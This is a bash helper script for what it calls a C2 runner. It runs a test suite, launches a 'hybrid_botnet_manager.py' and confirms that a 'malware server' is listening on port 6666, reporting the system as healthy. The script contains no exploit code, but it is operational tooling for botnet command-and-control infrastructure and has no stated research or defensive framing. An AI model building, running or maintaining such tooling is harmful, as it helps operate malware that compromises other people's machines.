#!/usr/bin/env bash
set -euo pipefail

PROJECT_ROOT="$(cd "$(dirname "$0")" && pwd)"
cd "$PROJECT_ROOT"

echo "🚀 C2 RUNNER - TESTS + MALWARE SERVER CHECK"
echo "=================================================="

# 1) Run tests
if [ -f tests/run_all_tests.py ]; then
  echo "🧪 Running test suite..."
  python3 tests/run_all_tests.py || { echo "❌ Tests failed"; exit 1; }
else
  echo "⚠️  Test runner not found, skipping tests"
fi

# 2) Start Hybrid Manager briefly to ensure malware server starts
echo "\n🔌 Verifying malware server (port 6666)..."
# Run manager with timeout to avoid hanging
( cd bane && timeout 12s python3 hybrid_botnet_manager.py >/tmp/c2_manager.out 2>&1 || true )

# 3) Check port 6666
if netstat -tlnp 2>/dev/null | grep -q ":6666 "; then
  echo "✅ Malware server is listening on port 6666"
else
  # Fallback: try curl to confirm recent start
  if curl -sS http://127.0.0.1:6666/ >/dev/null 2>&1; then
    echo "✅ Malware server responded on port 6666"
  else
    echo "❌ Malware server is not reachable on port 6666"
    echo "--- Manager output (last lines) ---"
    tail -n 50 /tmp/c2_manager.out || true
    exit 1
  fi
fi

echo "\n🎉 All checks passed. System is healthy."
